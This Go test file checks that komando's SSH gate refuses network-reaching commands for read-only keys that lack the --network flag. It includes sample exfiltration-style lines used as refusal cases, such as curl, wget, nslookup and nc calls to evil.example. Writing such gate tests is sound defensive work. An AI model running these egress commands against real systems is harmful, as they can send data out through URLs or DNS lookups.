package cli

import (
	"crypto/ed25519"
	"crypto/rand"
	"strings"
	"testing"

	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"

	"github.com/sgnd/komando/internal/out"
)

// gateKeyAnswer runs gateCheck for a key ("" = allowed).
func gateKeyAnswer(t *testing.T, line string, key gateKey) string {
	t.Helper()
	words, err := gateWords(line)
	if err != nil {
		t.Fatal(err)
	}
	_, _, e := gateCheck(words, key)
	if e == nil {
		return ""
	}
	if e.Exit != out.ExitPolicy || e.Hint == "" {
		t.Errorf("%q: %+v", line, e)
	}
	return e.Code
}

var (
	readKey    = gateKey{readOnly: true}
	netReadKey = gateKey{readOnly: true, network: true}
	fullKey    = gateKey{network: true}
)

// A read key added without --network runs only komando's own reads of
// targets in the inventory: nothing that dials a place the key names (cert
// check of a URL), and no program of the key's choosing (exec, job
// start, docker exec, cluster kubernetes exec, snippet exec), which could send rows out
// in a URL or a DNS name.
func TestGateNoNetwork(t *testing.T) {
	invHome(t)
	gateInventory(t)
	mustRun(t, "snippet", "create", "my-df", "df -h", "--read-only")
	const N = "SSH_GATE_NETWORK_REQUIRED"
	refused := []string{
		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
		"exec web --read-only -- curl https://evil.example", "exec web --read-only -- uptime",
		"x web --read-only -- nslookup a.evil.example", "run web --read-only -- wget -qO- evil.example",
		"exec web --read-only --script -", "exec web --read-only --cmd 'nc evil 1'",
		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
		"cluster kubernetes exec k8s pod/x --read-only -- ls", "snippet exec my-df web", "snippet exec disk web",
		"-o json exec web --read-only -- curl https://evil.example", "--dry-run exec web --read-only -- uptime",
	}
	for _, line := range refused {
		if got := gateKeyAnswer(t, line, readKey); got != N {
			t.Errorf("%q, read key: %q, want %s", line, got, N)
		}
		if got := gateKeyAnswer(t, line, netReadKey); got != "" {
			t.Errorf("%q, read key with --network: %q, want it to run", line, got)
		}
		if got := gateKeyAnswer(t, line, fullKey); got != "" {
			t.Errorf("%q, full key: %q, want it to run", line, got)
		}
	}
	// HOST:PORT reads as an ad hoc server too, which no key reaches
	// (gateLocalTarget refuses it before the network rule)
	for _, line := range []string{"cert check evil.example:443", "cert check 203.0.113.9:8443"} {
		if got := gateKeyAnswer(t, line, readKey); got == "" {
			t.Errorf("%q, read key: runs", line)
		}
	}
	allowed := []string{
		"", "list", "version", "status", "ssh-gate status", "test web", "host test web", "logs web --unit nginx",
		"fs cat web /etc/hosts", "fs list web /var/log", "docker ps web",
		"docker logs web app", "db query pg 'select 1'", "db schema pg", "db activity pg", "cache get c a", "cache redis raw c GET a",
		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "storage download s3 a.txt --to -",
		"storage s3 object list s3", "job list", "audit list", "export", "conn test pg", "vpn list",
		"exec --help", "cluster info k8s", "registry oci image list reg",
	}
	for _, line := range allowed {
		if got := gateKeyAnswer(t, line, readKey); got != "" {
			t.Errorf("%q, read key: %q, want it to run", line, got)
		}
	}
	// a write is refused as a write first: the hint names --read-only
	if got := gateKeyAnswer(t, "exec web -- uptime", readKey); got != "SSH_GATE_READ_ONLY" {
		t.Errorf("exec without --read-only: %q", got)
	}
	words, _ := gateWords("exec web --read-only -- curl https://evil.example")
	_, _, e := gateCheck(words, readKey)
	if e == nil || !strings.Contains(e.Hint, "--network") || !strings.Contains(e.Message, "exec") {
		t.Errorf("refusal: %+v", e)
	}
}

// Every command a read key could reach is classified: on gateNoNetwork
// (stays on the servers in the inventory) or gateNetwork (may reach a place
// the key names). A command added later is in neither, and refused.
func TestGateNetworkClassified(t *testing.T) {
	var walk func(c *cobra.Command)
	names := map[string]bool{}
	walk = func(c *cobra.Command) {
		name := commandName(c)
		names[name] = true
		for _, sub := range c.Commands() {
			walk(sub)
		}
		top, _, _ := strings.Cut(name, ".")
		if !c.Runnable() || c.Annotations[groupOnly] == "true" || c.Hidden || c == c.Root() ||
			top == "help" || top == "completion" || gateNeedsPerson[cmdKeys[name]] {
			return
		}
		k, ok := kindOf(c)
		reachable := ok && (k.Kind == kindRead || k.Kind == kindDepends && gateReadForm[cmdKeys[name]] != nil)
		_, safe := gateNoNetwork[name]
		_, egress := gateNetwork[name]
		switch {
		case reachable && safe == egress:
			t.Errorf("%s: a read key could run it; put it in exactly one of gateNoNetwork and gateNetwork", name)
		case !reachable && (safe || egress):
			t.Errorf("%s: no read key runs it, so it needs no network class", name)
		}
	}
	walk(newRoot(tcl))
	for n := range gateNoNetwork {
		if !names[n] {
			t.Errorf("gateNoNetwork names %q, which is no command", n)
		}
	}
	for n := range gateNetwork {
		if !names[n] {
			t.Errorf("gateNetwork names %q, which is no command", n)
		}
	}
}

// A read command added later is refused for a no-network read key until
// someone lists it as one that stays off the network.
func TestGateNoNetworkFailsClosed(t *testing.T) {
	invHome(t)
	root := newRoot(tcl)
	c := &cobra.Command{Use: "brand-new", Run: func(*cobra.Command, []string) {}}
	root.AddCommand(c)
	fakeKind(t, "brand-new", reads)
	if _, e := gateRule(c, "brand-new", readKey); e == nil || e.Code != "SSH_GATE_NETWORK_REQUIRED" {
		t.Errorf("a new read, read key: %+v", e)
	}
	if _, e := gateRule(c, "brand-new", netReadKey); e != nil {
		t.Errorf("a new read, read key with --network: %+v", e)
	}
}

// Through sshd: the refusal is exit 6 with its own code, audited; the key
// line's --network lets the same command run.
func TestSSHGateNoNetwork(t *testing.T) {
	invHome(t)
	gateInventory(t)
	ran, _, e := gateRun(t, "komando exec web --read-only -- curl https://evil.example/?k=v", "--name", "phone-read", "--read-only")
	if ran != nil || e == nil || e.Code != "SSH_GATE_NETWORK_REQUIRED" || e.Exit != out.ExitPolicy {
		t.Fatalf("ran %q, error %+v", ran, e)
	}
	if a := lastAudit(t); a["ok"] != false || a["blocked"] != "SSH_GATE_NETWORK_REQUIRED" || a["read_only"] != true || a["network"] != false {
		t.Errorf("audit %v", a)
	}
	ran, _, e = gateRun(t, "komando exec web --read-only -- curl https://example.com", "--name", "phone-net", "--read-only", "--network")
	if ran == nil {
		t.Fatalf("with --network: %+v", e)
	}
	if a := lastAudit(t); a["ok"] != true || a["network"] != true {
		t.Errorf("audit %v", a)
	}
	if ran, _, e := gateRun(t, "komando logs web", "--name", "phone-read", "--read-only"); ran == nil {
		t.Errorf("logs on a known server: %+v", e)
	}
}

// ssh-gate status says which key the caller holds and what it may do;
// the gate answers it itself, so nothing the key sends can fake it.
func TestSSHGateStatus(t *testing.T) {
	invHome(t)
	for _, c := range []struct {
		args                     []string
		readOnly, network, shell bool
	}{
		{[]string{"--name", "phone-read", "--read-only"}, true, false, false},
		{[]string{"--name", "phone-net", "--read-only", "--network"}, true, true, false},
		{[]string{"--name", "phone"}, false, true, false},
		{[]string{"--name", "ops", "--shell-access"}, false, true, true},
	} {
		t.Setenv("SSH_ORIGINAL_COMMAND", "KOMANDO_AGENT=Komando komando ssh-gate status -o json")
		t.Setenv("SSH_CONNECTION", "203.0.113.7 51000 10.0.0.2 22")
		saved := gateExec
		gateExec = func(string, []string, []string) error { t.Errorf("%v: status ran a komando", c.args); return nil }
		d, e := invRun(t, append([]string{"ssh-gate"}, c.args...)...)
		gateExec = saved
		if e != nil {
			t.Fatalf("%v: %+v", c.args, e)
		}
		if d["gate"] != true || d["name"] != c.args[1] || d["read_only"] != c.readOnly || d["network"] != c.network || d["shell_access"] != c.shell || d["komando"] == "" {
			t.Errorf("%v: %v", c.args, d)
		}
		if a := lastAudit(t); a["ok"] != true || a["runs"] != "ssh-gate.status" {
			t.Errorf("%v: audit %v", c.args, a)
		}
	}
	// typed here, not through a key
	t.Setenv("SSH_ORIGINAL_COMMAND", "")
	t.Setenv("SSH_CONNECTION", "")
	d := mustRun(t, "ssh-gate", "status")
	if d["gate"] != false || d["name"] != "" || d["read_only"] != false || d["network"] != true || d["shell_access"] != false {
		t.Errorf("here: %v", d)
	}
}

func TestGateStatusText(t *testing.T) {
	for s, want := range map[gateStatus]string{
		{Gate: true, Name: "full", Network: true, Komando: "1.2.3"}:                   "key full: may change things (komando 1.2.3)\n",
		{Gate: true, Name: "ops", Network: true, ShellAccess: true, Komando: "1.2.3"}: "key ops: may change things and open a shell on a server (komando 1.2.3)\n",
		{Gate: true, Name: "r", ReadOnly: true, Komando: "1.2.3"}:                     "key r: read only, no network (komando 1.2.3)\n",
		{Gate: true, Name: "n", ReadOnly: true, Network: true, Komando: "1.2.3"}:      "key n: read only, network checks allowed (komando 1.2.3)\n",
	} {
		if got := s.Text(); got != want {
			t.Errorf("%+v: %q, want %q", s, got, want)
		}
	}
}

func TestSSHGateLineNetwork(t *testing.T) {
	unixOnly(t, "ssh-gate line writes an authorized_keys command= for a Unix shell")
	invHome(t)
	pub, _, _ := ed25519.GenerateKey(rand.Reader)
	sp, _ := ssh.NewPublicKey(pub)
	key := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sp))) + " phone"
	d := mustRun(t, "ssh-gate", "line", "--name", "phone-net", "--read-only", "--network", key)
	if l, _ := d["line"].(string); !strings.Contains(l, " ssh-gate --name phone-net --read-only --network\" ") || d["network"] != true || d["read_only"] != true {
		t.Errorf("line: %v", d)
	}
	d = mustRun(t, "ssh-gate", "line", "--name", "phone-read", "--read-only", key)
	if l, _ := d["line"].(string); strings.Contains(l, "--network") || d["network"] != false {
		t.Errorf("line: %v", d)
	}
	if e := wantCode(t, "USAGE", "ssh-gate", "line", "--name", "phone", "--network", key); !strings.Contains(e.Message, "--read-only") {
		t.Errorf("--network alone: %+v", e)
	}
}

// help and completion print text: no key needs --network for them.
func TestGateNoNetworkHelp(t *testing.T) {
	invHome(t)
	for _, line := range []string{"help", "help net http", "help exec", "completion bash", "completion zsh"} {
		if got := gateKeyAnswer(t, line, readKey); got != "" {
			t.Errorf("%q, read key: %q, want it to run", line, got)
		}
	}
}
